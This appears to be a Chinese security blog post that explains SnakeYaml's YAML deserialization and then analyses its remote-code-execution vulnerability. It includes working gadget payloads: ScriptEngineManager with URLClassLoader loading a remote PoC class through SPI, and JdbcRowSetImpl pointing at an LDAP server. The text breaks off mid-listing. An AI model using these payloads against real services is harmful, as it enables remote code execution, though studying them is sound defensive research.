    <content type="html"><![CDATA[<h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="SnakeYaml简介"><a href="#SnakeYaml简介" class="headerlink" title="SnakeYaml简介"></a>SnakeYaml简介</h3><p>YAML是”YAML Ain’t a Markup Language”（YAML不是一种标记语言）的递归缩写，是一个可读性高、用来表达数据序列化的格式，类似于XML但比XML更简洁。</p><p>在Java中，有一个用于解析YAML格式的库，即SnakeYaml。</p><p>SnakeYaml是一个完整的YAML1.1规范Processor，支持UTF-8/UTF-16，支持Java对象的序列化/反序列化，支持所有YAML定义的类型。</p><h3 id="YAML语法与结构"><a href="#YAML语法与结构" class="headerlink" title="YAML语法与结构"></a>YAML语法与结构</h3><p>YAML基本格式要求：</p><ol><li>YAML大小写敏感；</li><li>使用缩进代表层级关系；</li><li>缩进只能使用空格，不能使用TAB，不要求空格个数，只需要相同层级左对齐（一般2个或4个空格）</li></ol><p>示例如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">environments:</span></span><br><span class="line"><span class="attr">    dev:</span></span><br><span class="line"><span class="attr">        url:</span> <span class="attr">http://dev.bar.com</span></span><br><span class="line"><span class="attr">        name:</span> <span class="string">Developer</span> <span class="string">Setup</span></span><br><span class="line"><span class="attr">    prod:</span></span><br><span class="line"><span class="attr">        url:</span> <span class="attr">http://foo.bar.com</span></span><br><span class="line"><span class="attr">        name:</span> <span class="string">My</span> <span class="string">Cool</span> <span class="string">App</span></span><br><span class="line"><span class="attr">my:</span></span><br><span class="line"><span class="attr">    servers:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">dev.bar.com</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">foo.bar.com</span></span><br></pre></td></tr></table></figure><p>YAML支持三种数据结构：</p><p>1、对象</p><p>使用冒号代表，格式为key: value。冒号后面要加一个空格：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">key:</span> <span class="string">value</span></span><br></pre></td></tr></table></figure><p>可以使用缩进表示层级关系：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">key:</span> </span><br><span class="line"><span class="attr">    child-key:</span> <span class="string">value</span></span><br><span class="line"><span class="attr">    child-key2:</span> <span class="string">value2</span></span><br></pre></td></tr></table></figure><p>2、数组</p><p>使用一个短横线加一个空格代表一个数组项：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">hobby:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">Java</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">LOL</span></span><br></pre></td></tr></table></figure><p>3、常量</p><p>YAML中提供了多种常量结构，包括：整数，浮点数，字符串，NULL，日期，布尔，时间。下面使用一个例子来快速了解常量的基本使用：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">boolean: </span><br><span class="line">    - TRUE  <span class="meta">#true,True都可以</span></span><br><span class="line">    - FALSE  <span class="meta">#false，False都可以</span></span><br><span class="line"><span class="keyword">float</span>:</span><br><span class="line">    - <span class="number">3.14</span></span><br><span class="line">    - <span class="number">6.8523015e+5</span>  <span class="meta">#可以使用科学计数法</span></span><br><span class="line"><span class="keyword">int</span>:</span><br><span class="line">    - <span class="number">123</span></span><br><span class="line">    - <span class="number">0b1010</span>_0111_0100_1010_1110    <span class="meta">#二进制表示</span></span><br><span class="line"><span class="literal">null</span>:</span><br><span class="line">    nodeName: <span class="string">'node'</span></span><br><span class="line">    parent: ~  <span class="meta">#使用~表示null</span></span><br><span class="line"><span class="keyword">string</span>:</span><br><span class="line">    - 哈哈</span><br><span class="line">    - <span class="string">'Hello world'</span>  <span class="meta">#可以使用双引号或者单引号包裹特殊字符</span></span><br><span class="line">    - newline</span><br><span class="line">      newline2    <span class="meta">#字符串可以拆成多行，每一行会被转化成一个空格</span></span><br><span class="line">date:</span><br><span class="line">    - <span class="number">2018</span><span class="number">-02</span><span class="number">-17</span>    <span class="meta">#日期必须使用ISO 8601格式，即yyyy-MM-dd</span></span><br><span class="line">datetime: </span><br><span class="line">    -  <span class="number">2018</span><span class="number">-02</span><span class="number">-17</span>T15:<span class="number">02</span>:<span class="number">31</span>+<span class="number">08</span>:<span class="number">00</span>    <span class="meta">#时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区</span></span><br></pre></td></tr></table></figure><p>更多的关于YAML的语法及使用可参考：<a href="https://www.yiibai.com/yaml" target="_blank" rel="noopener">https://www.yiibai.com/yaml</a></p><h3 id="使用SnakeYaml进行序列化和反序列化"><a href="#使用SnakeYaml进行序列化和反序列化" class="headerlink" title="使用SnakeYaml进行序列化和反序列化"></a>使用SnakeYaml进行序列化和反序列化</h3><p>SnakeYaml提供了Yaml.dump()和Yaml.load()两个函数对yaml格式的数据进行序列化和反序列化。</p><ul><li>Yaml.load()：入参是一个字符串或者一个文件，经过序列化之后返回一个Java对象；</li><li>Yaml.dump()：将一个对象转化为yaml文件形式；</li></ul><p>下面看下简单的用法，用的SnakeYaml版本是最新版的1.25。</p><p>User类，拥有一个name属性及其setter方法和getter方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test.java，序列化新建的User对象为yaml格式内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">"mi1k7ea"</span>);</span><br><span class="line">        Yaml yaml = <span class="keyword">new</span> Yaml();</span><br><span class="line">        String s = yaml.dump(user);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出yaml格式的内容，<strong>这里”!!”用于强制类型转化，”!!User”是将该对象转为User类，如果没有”!”则就是个key为字符串的Map</strong>：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!User</span> <span class="string">&#123;name:</span> <span class="string">mi1k7ea&#125;</span></span><br></pre></td></tr></table></figure><p>修改Test.java，反序列化yaml格式内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String s = <span class="string">"!!User &#123;name: mi1k7ea&#125;"</span>;</span><br><span class="line">        Yaml yaml = <span class="keyword">new</span> Yaml();</span><br><span class="line">        User user = yaml.load(s);</span><br><span class="line">        System.out.println(user + <span class="string">":"</span> + user.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出，看到成功反序列化出User对象：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User@5e8c92f4:mi1k7ea</span><br></pre></td></tr></table></figure><h3 id="SnakeYaml反序列化的类方法调用"><a href="#SnakeYaml反序列化的类方法调用" class="headerlink" title="SnakeYaml反序列化的类方法调用"></a>SnakeYaml反序列化的类方法调用</h3><p>类比下Fastjson和Jackson的反序列化的类方法调用，这里我们也试下Yaml.load()在调用时会调用将要反序列化的类的哪些方法。</p><p>这里我们修改User类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"User构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"User.getName"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"User.setName"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"User.getAge"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"User.setAge"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String s = <span class="string">"!!User &#123;name: mi1k7ea, age: 6&#125;"</span>;</span><br><span class="line">        Yaml yaml = <span class="keyword">new</span> Yaml();</span><br><span class="line">        User user = yaml.load(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出看到，调用了反序列化的类的构造函数和yaml格式内容中包含的属性的setter方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User构造函数</span><br><span class="line">User.setName</span><br><span class="line">User.setAge</span><br></pre></td></tr></table></figure><h3 id="SnakeYaml反序列化过程调试分析"><a href="#SnakeYaml反序列化过程调试分析" class="headerlink" title="SnakeYaml反序列化过程调试分析"></a>SnakeYaml反序列化过程调试分析</h3><p>SnakeYaml反序列化的实现主要是通过反射机制来查找对应的Java类，新建一个实例并将对应的属性值赋给该实例。</p><p>在前面的反序列化Demo中，在<code>User user = yaml.load(s);</code>上打上断点开始调试。</p><p>在load()函数中会先生成一个StreamReader，将yaml数据通过构造函数赋给StreamReader，再调用loadFromReader()函数：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/1.png" alt=""></p><p>在loadFromReader()函数中，调用了BaseConstructor.getSingleData()函数，此时type为java.lang.Object，指定从yaml格式数据中获取数据类型是Object类型：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/2.png" alt=""></p><p>跟进getSingleData()函数中，先创建一个Node对象（其中调用getSingleNote()会根据流来生成一个文件，即将字符串按照yaml语法转为Node对象），然后判断当前Node是否为空且是否Tag为空，若不是则判断yaml格式数据的类型是否为Object类型、是否有根标签，这里都判断不通过，最后返回调用constructDocument()函数的结果：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/3.png" alt=""></p><p>跟下去继续调试，跟到getClassForNode()函数中，先根据tag取出className为User，然后调用getClassForName()函数获取到具体的User类：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/4.png" alt=""></p><p>在getClassName()函数中，判断开头是否是Tag.PREFIX即”tag:yaml.org,2002:”，是的话进行UTF-8编码并返回该类名：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/5.png" alt=""></p><p>而在getClassForName()函数中，根据获取到的User类名来调用<code>Class.forName()</code>即通过反射的方式来获取目标类User：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/6.png" alt=""></p><p>往下调试发现，调用construct()函数构造User类对象：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/7.png" alt=""></p><p>进一步跟进constructJavaBean2ndStep()函数，其中会获取yaml格式数据中的属性的键值对，然后调用propert.set()来设置新建的User对象的属性值：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/8.png" alt=""></p><p>跟进MethodProperty.set()函数，就是通过反射机制来调用User类name属性的setter方法来进行属性值的设置的：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/9.png" alt=""></p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/10.png" alt=""></p><p>属性值设置完成后，就返回新建的含有属性值的User类对象了。</p><p>整个SnakeYaml反序列化的过程就这样。</p><h2 id="0x02-SnakeYaml反序列化漏洞"><a href="#0x02-SnakeYaml反序列化漏洞" class="headerlink" title="0x02 SnakeYaml反序列化漏洞"></a>0x02 SnakeYaml反序列化漏洞</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>SnakeYaml全版本都可被反序列化漏洞利用。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>因为SnakeYaml支持反序列化Java对象，所以当Yaml.load()函数的参数外部可控时，攻击者就可以传入一个恶意类的yaml格式序列化内容，当服务端进行yaml反序列化获取恶意类时就会触发SnakeYaml反序列化漏洞。</p><h3 id="复现利用（基于ScriptEngineManager利用链）"><a href="#复现利用（基于ScriptEngineManager利用链）" class="headerlink" title="复现利用（基于ScriptEngineManager利用链）"></a>复现利用（基于ScriptEngineManager利用链）</h3><p>本次利用是基于javax.script.ScriptEngineManager的利用链。</p><p>简单地说，ScriptEngineManager类用于Java和JavaScript之间的调用。</p><p>PoC.java，需要实现ScriptEngineManager接口类，其中的静态代码块用于执行恶意代码，将其编译成PoC.class然后放置于第三方Web服务中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC</span> <span class="keyword">implements</span> <span class="title">ScriptEngineFactory</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"Hacked by mi1k7ea"</span>);</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getEngineName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getEngineVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">getExtensions</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">getMimeTypes</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">getNames</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getLanguageName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getLanguageVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getParameter</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getMethodCallSyntax</span><span class="params">(String obj, String m, String... args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getOutputStatement</span><span class="params">(String toDisplay)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getProgram</span><span class="params">(String... statements)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ScriptEngine <span class="title">getScriptEngine</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test.java，假设的Yaml.load()外部可控的服务端漏洞程序：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String poc = <span class="string">"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1/\"]]]]"</span>;</span><br><span class="line">        Yaml yaml = <span class="keyword">new</span> Yaml();</span><br><span class="line">        yaml.load(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到，关键PoC如下，注意每个首次出现的”[“字符前面需要有个空格：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!javax</span><span class="string">.script.ScriptEngineManager</span> <span class="string">[!!java.net.URLClassLoader</span> <span class="string">[[!!java.net.URL</span> <span class="string">["http://127.0.0.1/"]]]]</span></span><br></pre></td></tr></table></figure><p>另外，在已放置PoC.class的第三方Web服务中，在当前目录新建如下文件<code>META-INF\services\javax.script.ScriptEngineFactory</code>，其中内容为指定被执行的类名PoC（具体为啥这么做在后面的调试分析中会说到）：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/12.png" alt=""></p><p>注意，不要添加”.class”，否则”.”会被当做目录来进行分割处理，从而不能正确地获取到class文件。</p><p>最后运行Test即可触发漏洞：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/11.png" alt=""></p><p>当然，还可以直接打包成恶意jar包放置在第三方Web服务中来触发：<a href="https://github.com/artsploit/yaml-payload" target="_blank" rel="noopener">https://github.com/artsploit/yaml-payload</a></p><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>在<code>yaml.load(poc);</code>打上断点开始调试。</p><p>yaml数据解析的过程和前面章节的过程分析一样的，我们就看看关键部分就好。</p><p>调试发现，在调用完如下调用链获取到类名”javax.script.ScriptEngineManager”之后，会返回到调用链中的construct()函数中调用获取到的构造器的constrcut()方法，然后就会继续遍历解析得到yaml格式数据内的”java.net.URLClassLoader”类名和”java.net.URL”类名：</p><p>constructDocument-&gt;constructObject-&gt;constructObjectNoCheck-&gt;construct-&gt;getConstructor-&gt;getClassForNode-&gt;getClassForName</p><p>往下调试，在返回到的Constructor$ConstructSequence.construct()方法中，程序往下执行会调用newInstance()函数来新建实例：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/13.png" alt=""></p><p>这里为新建ScriptEngineManager类实例，其中argumentList参数为URLClassLoader类对象。</p><p>然后就调用到了ScriptEngineManager类的构造函数了：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/14.png" alt=""></p><p>在init()中调用了initEngines()，跟进initEngines()，<strong>看到调用了<code>ServiceLoader&lt;ScriptEngineFactory&gt;</code>，这个就是Java的SPI机制，它会去寻找目标URL中<code>META-INF/services</code>目录下的名为javax.script.ScriptEngineFactory的文件，获取该文件内容并加载文件内容中指定的类即PoC，这就是前面为什么需要我们在一台第三方Web服务器中新建一个指定目录的文件，同时也说明了ScriptEngineManager利用链的原理就是基于SPI机制来加载执行用户自定义实现的ScriptEngineManager接口类的实现类，从而导致代码执行</strong>：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/16.png" alt=""></p><p>跟下去，在ServiceLoader$LazyIterator.nextService()函数中调用<code>Class.forName()</code>即通过反射来获取目标URL上的PoC.class，此时在Web服务端会看到被请求访问PoC.class的记录；接着c.newInstance()函数创建的PoC类实例传入javax.script.ScriptEngineManager类的cast()方法来执行：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/15.png" alt=""></p><p>此时由于新建的是PoC类实例，因此会调用到PoC类的构造函数，而该类的静态代码块会被执行一遍，从而触发率任意代码执行漏洞。</p><h3 id="相关应用CVE"><a href="#相关应用CVE" class="headerlink" title="相关应用CVE"></a>相关应用CVE</h3><p><strong>Resteasy</strong></p><ul><li><a href="https://www.vulners.com/search?query=CVE-2016-9606" target="_blank" rel="noopener">CVE-2016-9606</a></li></ul><p><strong>Apache Camel</strong></p><ul><li><a href="https://www.vulners.com/search?query=CVE-2017-3159" target="_blank" rel="noopener">CVE-2017-3159</a></li></ul><p><strong>Apache Brooklyn</strong></p><ul><li><a href="https://www.vulners.com/search?query=CVE-CVE-2016-8744" target="_blank" rel="noopener">CVE-2016-8744</a></li></ul><h2 id="0x03-更多Gadgets探究"><a href="#0x03-更多Gadgets探究" class="headerlink" title="0x03 更多Gadgets探究"></a>0x03 更多Gadgets探究</h2><p>下面看下其他反序列化Gadgets在SnakeYaml中的利用，具体的调试分析过程就只简单提下并给出主要的利用链就好。</p><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>基于JdbcRowSetImpl的Gadget十分经典，有基于RMI和LDAP的，因为LDAP的利用范围更广，因此这里就只跑这个场景，具体原理之前讲过就不再赘述。</p><p>PoC，注意添加换行符：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String poc = <span class="string">"!!com.sun.rowset.JdbcRowSetImpl\n dataSourceName: \"ldap://localhost:1389/Exploit\"\n autoCommit: true"</span>;</span><br></pre></td></tr></table></figure><p>另外还需搭建LDAP服务和恶意类Exploit。</p><p>运行即可触发：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/17.png" alt=""></p><p>简单地说，就是SnakeYaml在调用Yaml.load()反序列化的时候，会调用到JdbcRowSetImpl类的dataSourceName属性的setter方法即setDataSourceName()，然后就触发后续一系列的利用链最后达到任意代码执行的目的。</p><p>函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td 